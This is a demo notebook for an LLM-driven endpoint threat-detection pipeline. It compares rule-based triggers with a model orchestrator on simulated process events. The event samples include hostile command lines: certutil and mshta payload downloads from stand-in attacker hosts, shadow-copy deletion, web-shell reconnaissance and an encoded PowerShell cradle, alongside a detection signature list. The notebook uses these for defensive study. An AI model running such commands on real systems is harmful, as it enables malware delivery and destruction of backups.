# %% [markdown]
# # cyber-ignition-agents · demo notebook
#
# Companion to **"The Ignition Problem"** by Andrew Hinton.
#
# The central argument: *initiation autonomy is a property of the sensing layer,
# not the agent.* The same five-node LangGraph pipeline runs in both modes below.
# What differs is what fires it.
#
# | Mode | Sensing layer | Human involvement in detection |
# |---|---|---|
# | **Category 3** — rule-based | `TRIGGER_SIGNATURES` list → `is_trigger()` → Haiku triage | Human wrote the rules |
# | **Category 4** — orchestrator | `OrchestratorSession` reasons from general knowledge | None |
#
# **Architecture**
# ```
# [Layer 1]  sensor/monitor.py + sensor/orchestrator.py   ← ignition layer
# [Layer 2]  agent/graph.py  (LangGraph 5-node pipeline)  ← orchestration
# [Layer 3]  agent/agent.py  (ReAct agent + 4 tools)      ← reasoning
# [Layer 4]  memory/store.py (ChromaDB + JSON history)    ← persistence
# ```
#
# **Sections**
# 1. Setup
# 2. Scenarios — the raw event data
# 3. Category 3 — rule-based sensor (dry-run, no LLM)
# 4. Category 4 — adaptive orchestrator (Haiku calls)
# 5. Pipeline step-by-step (Sonnet calls)
# 6. Agent tools & memory
# 7. Full run — rules mode
# 8. Full run — orchestrator mode
# 9. Side-by-side comparison

# %% [markdown]
# ---
# ## 1. Setup

# %%
import os, sys, json, time
from pathlib import Path
from datetime import datetime, timedelta

# Locate project root whether running from notebooks/ or project root
vsc_path = globals().get('__vsc_ipynb_file__', '')
notebook_dir = Path(vsc_path).parent if vsc_path else Path.cwd()
project_root = notebook_dir.parent if notebook_dir.name == 'notebooks' else notebook_dir

# Add src/ first (editable install fallback), then project root
for p in [str(project_root / 'src'), str(project_root)]:
    if p not in sys.path:
        sys.path.insert(0, p)

os.chdir(project_root)
print(f"Project root : {project_root}")
print(f"Python       : {sys.version.split()[0]}")
# Out:
# Project root : /Users/andrewhinton/Documents/Autonoum_Agent_Demo/cyber-sense
# Python       : 3.13.11

# %%
from dotenv import load_dotenv
load_dotenv()

key = os.getenv("ANTHROPIC_API_KEY", "")
if key:
    print("✓  ANTHROPIC_API_KEY loaded")
else:
    print("✗  ANTHROPIC_API_KEY not found — set it in .env or uncomment below")
    # os.environ["ANTHROPIC_API_KEY"] = "sk-ant-..."
# Out:
# ✓  ANTHROPIC_API_KEY loaded

# %% [markdown]
# ---
# ## 2. Scenarios — the raw event data
#
# Each scenario is a list of process event dicts. The sensor sees these one at a time,
# exactly as it would see real psutil snapshots. The event format is identical for both
# simulated and real monitoring.

# %%
from cyber_ignition_agents.simulation.malicious import get_scenario_a, get_scenario_b, get_scenario_c
from cyber_ignition_agents.simulation.normal import get_normal_scenario

events_a, name_a = get_scenario_a()   # PowerShell download cradle
events_b, name_b = get_scenario_b()   # Web shell activity
events_c, name_c = get_scenario_c()   # Ransomware staging
events_n, name_n = get_normal_scenario()  # Benign baseline

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    print(f"  {name:<40} {len(events)} events")
# Out:
#   PowerShell Download Cradle               5 events
#   Web Shell Activity                       5 events
#   Ransomware Staging                       6 events
#   Normal User Activity (Baseline)          7 events

# %%
# Inspect the event format — every field the sensor and pipeline see
print(json.dumps(events_a[2], indent=2))  # the powershell.exe trigger event
# Out:
# {
#   "timestamp": "09:13:28",
#   "pid": 6789,
#   "name": "powershell.exe",
#   "parent_pid": 5432,
#   "parent_name": "cmd.exe",
#   "cmdline": "powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
#   "action": "process_start"
# }

# %%
# Print a human-readable process tree for each scenario
def show_tree(events, name):
    print(f"── {name}")
    for e in events:
        ts   = e.get("timestamp", "?")
        act  = e.get("action", "process_start")
        det  = e.get("detail", "")
        par  = e.get("parent_name") or "—"
        pid  = e.get("pid", "?")
        nm   = e.get("name", "?")
        cmd  = e.get("cmdline", "")
        if act == "process_start":
            print(f"   [{ts}] {nm} (pid {pid})  ←  {par}")
            if cmd and cmd != nm:
                print(f"            {cmd[:80]}")
        else:
            print(f"   [{ts}] {nm}  —  {det}")
    print()

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    show_tree(events, name)
# Out:
# ── PowerShell Download Cradle
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] cmd.exe (pid 5432)  ←  explorer.exe
#             cmd.exe /c
#    [09:13:28] powershell.exe (pid 6789)  ←  cmd.exe
#             powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
#    [09:13:30] certutil.exe (pid 7890)  ←  powershell.exe
#             certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Publ
#    [09:13:32] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# ── Web Shell Activity
#    [09:13:26] w3wp.exe (pid 5678)  ←  svchost.exe
#             c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool
#    [09:13:27] cmd.exe (pid 6543)  ←  w3wp.exe
#             cmd.exe /c whoami
#    [09:13:29] cmd.exe (pid 6544)  ←  w3wp.exe
#             cmd.exe /c net user
#    [09:13:31] cmd.exe (pid 6545)  ←  w3wp.exe
#             cmd.exe /c ipconfig /all
#    [09:13:33] cmd.exe (pid 6546)  ←  w3wp.exe
#             cmd.exe /c net group "Domain Admins" /domain
#
# ── Ransomware Staging
#    [09:13:26] update.exe (pid 8888)  ←  —
#             C:\Users\Public\AppData\Local\Temp\update.exe
#    [09:13:27] vssadmin.exe (pid 9001)  ←  update.exe
#             vssadmin.exe delete shadows /all /quiet
#    [09:13:29] update.exe  —  Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
#    [09:13:30] update.exe  —  Mass rename: Documents\*.* → Documents\*.locked (213 files)
#    [09:13:31] update.exe  —  Mass rename: Downloads\*.* → Downloads\*.locked (89 files)
#    [09:13:32] notepad.exe (pid 9002)  ←  update.exe
#             notepad.exe C:\Users\Public\Desktop\README_DECRYPT.txt
#
# ── Normal User Activity (Baseline)
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] chrome.exe (pid 3456)  ←  explorer.exe
#             chrome.exe --no-sandbox
#    [09:13:28] chrome.exe (pid 3457)  ←  chrome.exe
#             chrome.exe --type=renderer --no-sandbox
#    [09:13:28] chrome.exe (pid 3458)  ←  chrome.exe
#             chrome.exe --type=gpu-process --no-sandbox
#    [09:13:31] Code.exe (pid 4500)  ←  explorer.exe
#             Code.exe /home/user/projects/myapp
#    [09:13:32] node.exe (pid 4501)  ←  Code.exe
#             node.exe --max-old-space-size=4096 /home/user/.vscode/extensions/ms-python.pytho
#    [09:13:36] python.exe (pid 5000)  ←  Code.exe
#             python.exe /home/user/projects/myapp/scripts/generate_report.py

# %% [markdown]
# ---
# ## 3. Category 3 — Rule-based sensor (dry-run, no LLM)
#
# `is_trigger()` checks each process snapshot against `TRIGGER_SIGNATURES`.
# This is pure Python — no model is called. A human authored every rule in the list.
#
# The trigger check is the first gate in the two-step `watch_simulated()` path:
# ```
# is_trigger(snapshot) → True
#     → triage_with_llm(snapshot, context)  [Haiku, cost gate]
#         → on_trigger callback             [fires the full pipeline]
# ```
# This cell shows only the rule-matching gate. No API calls.

# %%
from cyber_ignition_agents.sensor.monitor import is_trigger, TRIGGER_SIGNATURES

print(f"{len(TRIGGER_SIGNATURES)} active signatures:\n")
for sig in TRIGGER_SIGNATURES:
    parts = [f"{k}={v!r}" for k, v in sig.items()]
    print(f"  {'  AND  '.join(parts)}")
# Out:
# 6 active signatures:
#
#   process='powershell.exe'  AND  cmdline_contains='-EncodedCommand'
#   process='powershell.exe'  AND  cmdline_contains=' -enc '
#   parent='w3wp.exe'  AND  process='cmd.exe'
#   parent='w3wp.exe'  AND  process='powershell.exe'
#   parent='httpd.exe'  AND  process='cmd.exe'
#   process='vssadmin.exe'  AND  cmdline_contains='delete shadows'

# %%
# Feed each scenario through is_trigger() — observe which events match
def sensor_dry_run(events, name):
    print(f"── {name}")
    fired = False
    for e in events:
        snap = {
            "pid":         e["pid"],
            "name":        e["name"],
            "parent_pid":  e.get("parent_pid"),
            "parent_name": e.get("parent_name"),
            "cmdline":     e.get("cmdline", ""),
        }
        hit = is_trigger(snap)
        tag = "  ◀ TRIGGER" if hit else ""
        ts  = e.get("timestamp", "?")
        act = e.get("action", "process_start")
        par = e.get("parent_name") or "—"
        if act == "process_start":
            print(f"   [{ts}] {e['name']} (pid {e['pid']})  ←  {par}{tag}")
        else:
            print(f"   [{ts}] {e['name']}  —  {e.get('detail', act)}{tag}")
        if hit and not fired:
            fired = True
    if not fired:
        print("   → no trigger matched")
    print()

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    sensor_dry_run(events, name)
# Out:
# ── PowerShell Download Cradle
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] cmd.exe (pid 5432)  ←  explorer.exe
#    [09:13:28] powershell.exe (pid 6789)  ←  cmd.exe  ◀ TRIGGER
#    [09:13:30] certutil.exe (pid 7890)  ←  powershell.exe
#    [09:13:32] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# ── Web Shell Activity
#    [09:13:26] w3wp.exe (pid 5678)  ←  svchost.exe
#    [09:13:27] cmd.exe (pid 6543)  ←  w3wp.exe  ◀ TRIGGER
#    [09:13:29] cmd.exe (pid 6544)  ←  w3wp.exe  ◀ TRIGGER
#    [09:13:31] cmd.exe (pid 6545)  ←  w3wp.exe  ◀ TRIGGER
#    [09:13:33] cmd.exe (pid 6546)  ←  w3wp.exe  ◀ TRIGGER
#
# ── Ransomware Staging
#    [09:13:26] update.exe (pid 8888)  ←  —
#    [09:13:27] vssadmin.exe (pid 9001)  ←  update.exe  ◀ TRIGGER
#    [09:13:29] update.exe  —  Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
#    [09:13:30] update.exe  —  Mass rename: Documents\*.* → Documents\*.locked (213 files)
#    [09:13:31] update.exe  —  Mass rename: Downloads\*.* → Downloads\*.locked (89 files)
#    [09:13:32] notepad.exe (pid 9002)  ←  update.exe
#
# ── Normal User Activity (Baseline)
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] chrome.exe (pid 3456)  ←  explorer.exe
#    [09:13:28] chrome.exe (pid 3457)  ←  chrome.exe
#    [09:13:28] chrome.exe (pid 3458)  ←  chrome.exe
#    [09:13:31] Code.exe (pid 4500)  ←  explorer.exe
#    [09:13:32] node.exe (pid 4501)  ←  Code.exe
#    [09:13:36] python.exe (pid 5000)  ←  Code.exe
#    → no trigger matched

# %% [markdown]
# ### Adding a rule at runtime (the Category 3 extension pattern)
#
# A human writes a new rule, re-runs the sensor. This is how Category 3 adapts:
# not by reasoning, but by rule authorship.

# %%
from cyber_ignition_agents.sensor import monitor as mon

# Scenario: outlook.exe spawning mshta.exe — not in the default signatures
mshta_events = [
    {"timestamp": "10:00:00", "pid": 2000, "name": "outlook.exe",
     "parent_pid": None, "parent_name": None, "cmdline": "outlook.exe", "action": "process_start"},
    {"timestamp": "10:00:02", "pid": 2100, "name": "mshta.exe",
     "parent_pid": 2000, "parent_name": "outlook.exe",
     "cmdline": "mshta.exe http://attacker.example.com/payload.hta", "action": "process_start"},
]

print("Before adding rule:")
sensor_dry_run(mshta_events, "MSHTA from Outlook")

# Human adds the rule
mon.TRIGGER_SIGNATURES.append({"parent": "outlook.exe", "process": "mshta.exe"})
print(f"Rule added. Signatures now: {len(mon.TRIGGER_SIGNATURES)}")
print()

print("After adding rule:")
sensor_dry_run(mshta_events, "MSHTA from Outlook")
# Out:
# Before adding rule:
# ── MSHTA from Outlook
#    [10:00:00] outlook.exe (pid 2000)  ←  —
#    [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe
#    → no trigger matched
#
# Rule added. Signatures now: 7
#
# After adding rule:
# ── MSHTA from Outlook
#    [10:00:00] outlook.exe (pid 2000)  ←  —
#    [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe  ◀ TRIGGER

# %% [markdown]
# ---
# ## 4. Category 4 — Adaptive orchestrator (Haiku calls)
#
# `OrchestratorSession` feeds process events to `claude-haiku-4-5` with no pre-specified rules.
# The model reasons from general security knowledge and decides:
# - **INVESTIGATE** — fire the analysis pipeline
# - **CONTINUE** — keep watching; self-selects the next check interval (3–20 events)
#
# > **LLM calls:** each `add_event()` call that hits the check interval makes one Haiku call.
# > Each cell below makes 2–5 Haiku calls.
#
# This is the key architectural difference from Category 3: *no human authored what counts as suspicious.*

# %%
from cyber_ignition_agents.sensor.orchestrator import OrchestratorSession

def orchestrator_dry_run(events, name):
    """Feed events into an OrchestratorSession and print every decision."""
    print(f"── {name}  (no pre-specified rules)")
    session = OrchestratorSession(name)

    for e in events:
        ts  = e.get("timestamp", "?")
        act = e.get("action", "process_start")
        det = e.get("detail", "")
        par = e.get("parent_name") or "—"
        if act == "process_start":
            print(f"   [{ts}] {e['name']} (pid {e['pid']})  ←  {par}")
        else:
            print(f"   [{ts}] {e['name']}  —  {det}")

        decision, reasoning = session.add_event(e)

        if decision is None:
            continue   # not yet at check interval
        if decision:   # INVESTIGATE
            print(f"\n   [orchestrator] *** INVESTIGATE ***")
            print(f"   [orchestrator] {reasoning}")
            print(f"   [orchestrator] — pipeline would fire here —\n")
            return True
        else:          # CONTINUE
            print(f"\n   [orchestrator] CONTINUE  (next check in {session.next_check_events} events)")
            print(f"   [orchestrator] {reasoning}\n")

    # End of feed — force a final evaluation
    decision, reasoning = session.evaluate_now()
    label = "INVESTIGATE (final)" if decision else "CONTINUE (final — no investigation)"
    print(f"\n   [orchestrator] {label}")
    print(f"   [orchestrator] {reasoning}")
    print()
    return decision

# Scenario A: PowerShell cradle — expect INVESTIGATE
orchestrator_dry_run(events_a, name_a)
# Out:
# ── PowerShell Download Cradle  (no pre-specified rules)
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] cmd.exe (pid 5432)  ←  explorer.exe
#    [09:13:28] powershell.exe (pid 6789)  ←  cmd.exe
#    [09:13:30] certutil.exe (pid 7890)  ←  powershell.exe
#    [09:13:32] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
#    [orchestrator] *** INVESTIGATE ***
#    [orchestrator] This chain exhibits multiple hallmarks of malware delivery: (1) explorer.exe spawning cmd.exe is unusual and suggests process injection or compromise; (2) cmd.exe launching powershell with encoded commands indicates obfuscation/evasion tactics; (3) powershell spawning certutil to download an executable from an external domain to a world-writable directory is a classic staged payload attack pattern. The duplicate certutil command suggests either a retry mechanism or persistence attempt. This requires immediate forensic analysis of the encoded powershell command and the malicious.example.com domain.
#    [orchestrator] — pipeline would fire here —
# True

# %%
# Run all four scenarios — expect A/B/C → INVESTIGATE, N → CONTINUE
print("=" * 60)
for evts, nm in [(events_b, name_b), (events_c, name_c), (events_n, name_n)]:
    orchestrator_dry_run(evts, nm)
    print("=" * 60)
# Out:
# ============================================================
# ── Web Shell Activity  (no pre-specified rules)
#    [09:13:26] w3wp.exe (pid 5678)  ←  svchost.exe
#    [09:13:27] cmd.exe (pid 6543)  ←  w3wp.exe
#    [09:13:29] cmd.exe (pid 6544)  ←  w3wp.exe
#    [09:13:31] cmd.exe (pid 6545)  ←  w3wp.exe
#    [09:13:33] cmd.exe (pid 6546)  ←  w3wp.exe
#
#    [orchestrator] *** INVESTIGATE ***
#    [orchestrator] w3wp.exe (IIS application pool process) spawning multiple cmd.exe instances executing reconnaissance commands (whoami, net user, ipconfig, net group "Domain Admins") within seconds indicates potential web application compromise or exploitation. This pattern is consistent with post-exploitation activity where an attacker gains code execution through a web vulnerability and immediately begins reconnaissance to enumerate user accounts, network configuration, and domain administrative groups. IIS worker processes should not routinely spawn command shells for system enumeration.
#    [orchestrator] — pipeline would fire here —
#
# ============================================================
# ── Ransomware Staging  (no pre-specified rules)
#    [09:13:26] update.exe (pid 8888)  ←  —
#    [09:13:27] vssadmin.exe (pid 9001)  ←  update.exe
#    [09:13:29] update.exe  —  Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
#    [09:13:30] update.exe  —  Mass rename: Documents\*.* → Documents\*.locked (213 files)
#    [09:13:31] update.exe  —  Mass rename: Downloads\*.* → Downloads\*.locked (89 files)
#
#    [orchestrator] *** INVESTIGATE ***
#    [orchestrator] This activity exhibits classic ransomware behavior patterns. An executable from a temporary directory (update.exe) is launching vssadmin.exe with parameters to delete shadow copies (/all /quiet), which is a direct attack technique to prevent system recovery from backups. The subsequent repeated execution of update.exe suggests ongoing malicious activity. This combination is a high-confidence indicator of ransomware deployment and warrants immediate deep investigation.
#    [orchestrator] — pipeline would fire here —
#
# ============================================================
# ── Normal User Activity (Baseline)  (no pre-specified rules)
#    [09:13:26] explorer.exe (pid 1234)  ←  —
#    [09:13:27] chrome.exe (pid 3456)  ←  explorer.exe
#    [09:13:28] chrome.exe (pid 3457)  ←  chrome.exe
#    [09:13:28] chrome.exe (pid 3458)  ←  chrome.exe
#    [09:13:31] Code.exe (pid 4500)  ←  explorer.exe
#
#    [orchestrator] CONTINUE  (next check in 10 events)
#    [orchestrator] The observed activity represents normal user desktop behavior. Chrome launching from explorer.exe with standard renderer and GPU process children is expected browser operation, and the --no-sandbox flag, while often associated with automation, is commonly used in legitimate environments (CI/CD, development, accessibility). VS Code launching from explorer.exe to open a project directory is routine developer activity. No process injection, suspicious parent-child relationships, or command obfuscation is evident.
#
#    [09:13:32] node.exe (pid 4501)  ←  Code.exe
#    [09:13:36] python.exe (pid 5000)  ←  Code.exe
#
#    [orchestrator] CONTINUE (final — no investigation)
#    [orchestrator] This activity represents normal developer workflow. Chrome launching with --no-sandbox is expected browser behavior, and the renderer/GPU process children are standard Chrome architecture. VS Code launching a Python language server and the user executing a report generation script are routine development tasks. No suspicious process chains, privilege escalations, or anomalous execution patterns are present.
#
# ============================================================

# %% [markdown]
# ### Category 3 vs Category 4 on the mshta scenario
#
# Category 3 was silent until a human added a rule.
# The orchestrator catches the same technique from general knowledge — no rule needed.

# %%
print("Category 3 (after rule was added above):")
sensor_dry_run(mshta_events, "MSHTA from Outlook")

print("Category 4 (original signatures, no rule added):")
# Reset to original signatures so this is a fair comparison
original_sigs = [s for s in mon.TRIGGER_SIGNATURES if not (s.get("parent") == "outlook.exe")]
mon.TRIGGER_SIGNATURES[:] = original_sigs

orchestrator_dry_run(mshta_events, "MSHTA from Outlook")
# Out:
# Category 3 (after rule was added above):
# ── MSHTA from Outlook
#    [10:00:00] outlook.exe (pid 2000)  ←  —
#    [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe  ◀ TRIGGER
#
# Category 4 (original signatures, no rule added):
# ── MSHTA from Outlook  (no pre-specified rules)
#    [10:00:00] outlook.exe (pid 2000)  ←  —
#    [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe
#
#    [orchestrator] INVESTIGATE (final)
#    [orchestrator] Outlook spawning mshta.exe to fetch a remote HTA file from an external domain is a high-confidence indicator of email-based malware delivery or compromised Outlook process. This chain matches known attack patterns (e.g., malicious email attachments or macros triggering script execution). The suspicious domain and living-off-the-land tool (mshta) warrant immediate deep investigation to determine if this is credential theft, ransomware staging, or data exfiltration.
# True

# %% [markdown]
# ---
# ## 5. Pipeline step-by-step (Sonnet calls)
#
# The LangGraph pipeline has five nodes in a fixed linear chain:
# ```
# trigger_received → monitor_activity → analyze_sequence → classify_threat → generate_report
# ```
#
# Each node is a plain Python function: `node(state: ThreatState) → ThreatState`.
# Run them one at a time to inspect state after each step.
#
# > **LLM calls:** nodes 3 and 4 each call `claude-sonnet-4-6`. Expect 60–120s total.

# %%
from cyber_ignition_agents.agent.graph import (
    trigger_received, monitor_activity,
    analyze_sequence, classify_threat, generate_report,
    ThreatState,
)

# Build the trigger snapshot — the event that fired the sensor
STEP_EVENTS = events_a
STEP_NAME   = name_a
STEP_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_step"

# Use the first is_trigger() match as the trigger snapshot
from cyber_ignition_agents.sensor.monitor import is_trigger
step_trigger = None
for e in STEP_EVENTS:
    snap = {"pid": e["pid"], "name": e["name"],
            "parent_pid": e.get("parent_pid"), "parent_name": e.get("parent_name"),
            "cmdline": e.get("cmdline", "")}
    if is_trigger(snap):
        step_trigger = snap
        break

if step_trigger is None:          # normal scenario fallback
    e0 = STEP_EVENTS[0]
    step_trigger = {"pid": e0["pid"], "name": e0["name"],
                    "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
                    "cmdline": e0.get("cmdline", "")}

# Initial state — all analysis fields empty
state: ThreatState = {
    "scenario_name":          STEP_NAME,
    "session_id":             STEP_SESSION,
    "trigger":                step_trigger,
    "process_events":         STEP_EVENTS,
    "process_sequence":       "",
    "analysis":               "",
    "classification":         {},
    "report":                 "",
    "orchestrator_reasoning": "",
}

print(f"Scenario  : {STEP_NAME}")
print(f"Trigger   : {step_trigger['name']} (pid {step_trigger['pid']}) ← {step_trigger.get('parent_name')}")
print(f"Session   : {STEP_SESSION}")
print(f"Events    : {len(STEP_EVENTS)}")
# Out:
# Scenario  : PowerShell Download Cradle
# Trigger   : powershell.exe (pid 6789) ← cmd.exe
# Session   : 20260526_091347_step
# Events    : 5

# %%
# Node 1: trigger_received — logs the event, passes state through unchanged
state = trigger_received(state)
print("After trigger_received: state unchanged (logging only)")
# Out:
#   [1/5] trigger_received  — powershell.exe (pid 6789) <- cmd.exe
# After trigger_received: state unchanged (logging only)

# %%
# Node 2: monitor_activity — formats the event list into process_sequence string
state = monitor_activity(state)
print("process_sequence:\n")
print(state["process_sequence"])
# Out:
#   [2/5] monitor_activity  — 5 events collected
# process_sequence:
#
# [09:13:26] explorer.exe (pid 1234) spawned by — (pid —)
# [09:13:27] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
#            cmdline: cmd.exe /c
# [09:13:28] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
#            cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
# [09:13:30] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
#            cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
# [09:13:32] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

# %%
# Node 3: analyze_sequence — ReAct agent (Sonnet) with 4 tools
# The agent calls format_process_tree, identify_attack_patterns,
# lookup_mitre_technique, get_similar_threats, then synthesises an analysis.
state = analyze_sequence(state)
print("analysis (first 1000 chars):\n")
print(state["analysis"][:1000])
# Out:
#   [3/5] analyze_sequence  — invoking ReAct agent...
#   [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=09:13:47
#   [Anthropic API call] model=claude-sonnet-4-6  messages=4  ts=09:13:53
#   [Anthropic API call] model=claude-sonnet-4-6  messages=9  ts=09:13:59
#   [Anthropic API call] model=claude-sonnet-4-6  messages=11  ts=09:14:04
# analysis (first 1000 chars):
#
# All data collected. Here is the full structured threat analysis.
#
# ---
#
# ## 🔴 THREAT ANALYSIS REPORT — CRITICAL SEVERITY
#
# ---
#
# ### 1. MATCHED ATTACK PATTERN: **PowerShell Download Cradle**
#
# This sequence is a **textbook PowerShell Download Cradle**, matching every indicator in the reference pattern with zero deviation:
#
# | Reference Pattern Criteria | Observed |
# |---|---|
# | `explorer.exe` or Office app spawns `cmd.exe` | ✅ `explorer.exe (1234)` → `cmd.exe (5432)` |
# | `cmd.exe` spawns `powershell.exe` with `-EncodedCommand` | ✅ `cmd.exe (5432)` → `powershell.exe (6789) -EncodedCommand ...` |
# | PowerShell or child spawns `certutil.exe` with a URL | ✅ `powershell.exe (6789)` → `certutil.exe (7890) -urlcache -f http://...` |
# | Outbound connection to retrieve remote payload | ✅ TCP to `203.0.113.99:80` |
#
# The match is **complete and unambiguous** across all four criteria.
#
# ---
#
# ### 2. SUSPICIOUS PROCESSES AND BEHAVIORS
#
# #### 🔸 `cmd.exe` (pid 5432) — Spawned by `explorer.exe`
# - **Why suspicious

# %%
# Node 4: classify_threat — structured JSON verdict (Sonnet)
state = classify_threat(state)
print("classification:\n")
print(json.dumps(state["classification"], indent=2))
# Out:
#   [4/5] classify_threat   — calling LLM...
#   [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=09:14:45
# classification:
#
# {
#   "threat_level": "CRITICAL",
#   "confidence": 0.96,
#   "techniques": [
#     "T1059.001 - Command and Scripting Interpreter: PowerShell",
#     "T1027 - Obfuscated Files or Information",
#     "T1105 - Ingress Tool Transfer",
#     "T1218.003 - Signed Binary Proxy Execution: Certutil",
#     "T1140 - Deobfuscate/Decode Files or Information"
#   ],
#   "reasoning": "A confirmed, complete PowerShell Download Cradle attack chain is active \u2014 explorer.exe spawning cmd.exe with an encoded PowerShell command that invokes certutil.exe as a LOLBin to download a remote payload to C:\\Users\\Public\\, with three prior near-identical detections within a 90-minute window indicating an active campaign rather than an isolated incident.",
#   "recommended_actions": [
#     "IMMEDIATE ISOLATION: Quarantine the affected endpoint(s) from the network to prevent lateral movement, C2 communication, and further payload staging \u2014 prioritize hosts where payload.exe may have already been retrieved to C:\\Users\\Public\\.",
#     "ARTIFACT HUNTING: Search fleet-wide for C:\\Users\\Public\\payload.exe, associated certutil.exe execution events, and any child processes spawned from C:\\Users\\Public\\ using EDR telemetry; terminate any running instances of payload.exe immediately.",
#     "CAMPAIGN CORRELATION: Correlate all four detections (3 prior + current) by source host, user account, logon session, and network egress IP (203.0.113.99:80) to determine scope \u2014 assess whether this is a single persistent actor or automated worm-based lateral movement.",
#     "CREDENTIAL TRIAGE: Assume credential compromise on affected hosts; rotate passwords for all accounts with active sessions on isolated endpoints, prioritize privileged accounts, and check for new scheduled tasks, services, or registry run keys created around the time of each detected event.",
#     "FORENSIC PRESERVATION AND IOC BLOCKING: Preserve memory dumps and disk images of affected hosts before remediation; immediately block 203.0.113.99 and malicious.example.com at perimeter firewall and DNS, and submit payload.exe hash to threat intelligence platforms to identify the malware family and assess downstream impact risk."
#   ]
# }

# %%
# Node 5: generate_report — assembles the final formatted report
# Also saves to ChromaDB and JSON threat history if threat_level != BENIGN
state = generate_report(state)
print(state["report"])
# Out:
#   [5/5] generate_report   — formatting output
# CYBER-SENSE THREAT REPORT
# ==========================
# Timestamp: 2026-05-26 09:14:57
# Trigger:   powershell.exe spawned from cmd.exe
#
# Initiated by: environment signal (process monitor)
# Human involvement: none at detection or analysis stage
#
# PROCESS SEQUENCE
# ----------------
# [09:13:26] explorer.exe (pid 1234) spawned by — (pid —)
# [09:13:27] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
#            cmdline: cmd.exe /c
# [09:13:28] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
#            cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
# [09:13:30] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
#            cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
# [09:13:32] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
#
# THREAT CLASSIFICATION
# ---------------------
# Level:      CRITICAL
# Confidence: 0.96
# Technique:  T1059.001 - Command and Scripting Interpreter: PowerShell
#             T1027 - Obfuscated Files or Information
#             T1105 - Ingress Tool Transfer
#             T1218.003 - Signed Binary Proxy Execution: Certutil
#             T1140 - Deobfuscate/Decode Files or Information
#
# ANALYSIS
# --------
# All data collected. Here is the full structured threat analysis.
#
# ---
#
# ## 🔴 THREAT ANALYSIS REPORT — CRITICAL SEVERITY
#
# ---
#
# ### 1. MATCHED ATTACK PATTERN: **PowerShell Download Cradle**
#
# This sequence is a **textbook PowerShell Download Cradle**, matching every indicator in the reference pattern with zero deviation:
#
# | Reference Pattern Criteria | Observed |
# |---|---|
# | `explorer.exe` or Office app spawns `cmd.exe` | ✅ `explorer.exe (1234)` → `cmd.exe (5432)` |
# | `cmd.exe` spawns `powershell.exe` with `-EncodedCommand` | ✅ `cmd.exe (5432)` → `powershell.exe (6789) -EncodedCommand ...` |
# | PowerShell or child spawns `certutil.exe` with a URL | ✅ `powershell.exe (6789)` → `certutil.exe (7890) -urlcache -f http://...` |
# | Outbound connection to retrieve remote payload | ✅ TCP to `203.0.113.99:80` |
#
# The match is **complete and unambiguous** across all four criteria.
#
# ---
#
# ### 2. SUSPICIOUS PROCESSES AND BEHAVIORS
#
# #### 🔸 `cmd.exe` (pid 5432) — Spawned by `explorer.exe`
# - **Why suspicious:** `explorer.exe` is the Windows shell, and while it can legitimately spawn `cmd.exe` through user interaction, the bare `cmd.exe /c` invocation with no visible argument is a hallmark of a **stager or dropper** using `cmd.exe` as a thin execution wrapper. The `/c` flag without a visible trailing command in logs suggests the command body may have been passed at runtime or truncated, consistent with **obfuscated initial access**.
#
# #### 🔸 `powershell.exe` (pid 6789) — Spawned by `cmd.exe` with `-EncodedCommand`
# - **Why suspicious:** The `-EncodedCommand` (abbreviated `-EncodedCommand`) flag accepts a **Base64-encoded command string**, which is one of the most commonly abused PowerShell flags for obfuscation. It directly bypasses plain-text command-line logging. The encoded payload `JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...` partially decodes to `$c = New-Object` — consistent with a **`New-Object Net.WebClient`** download cradle or **COM-based payload loader**. No `-ExecutionPolicy Bypass` flag is visible in the truncated cmdline, but the encoded command itself may carry that logic internally.
#
# #### 🔸 `certutil.exe` (pid 7890) — Spawned by `powershell.exe`
# - **Why suspicious:** `certutil.exe` is a **signed Microsoft binary** (LOLBin — Living Off the Land Binary) being weaponized for payload staging. The specific flags used are definitive malicious indicators:
